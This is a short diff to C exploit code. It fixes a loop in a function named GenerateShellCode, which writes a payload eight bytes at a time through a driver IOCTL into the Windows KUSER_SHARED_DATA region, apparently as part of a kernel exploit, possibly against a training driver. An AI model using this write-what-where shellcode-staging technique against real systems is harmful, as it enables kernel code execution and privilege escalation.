@@ -329,7 +329,7 @@ void *GenerateShellCode(HANDLE driverHandle)
 
     for (int i = 0; i < payloadSizeInEight;i++)
     {
-        SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long*)payload)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
+        SendToDriver(driverHandle,0x0022200B,(void*) ( *(((unsigned long long*) payload)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
     }
 
     return (void*) KUSER_SHARED_DATA;
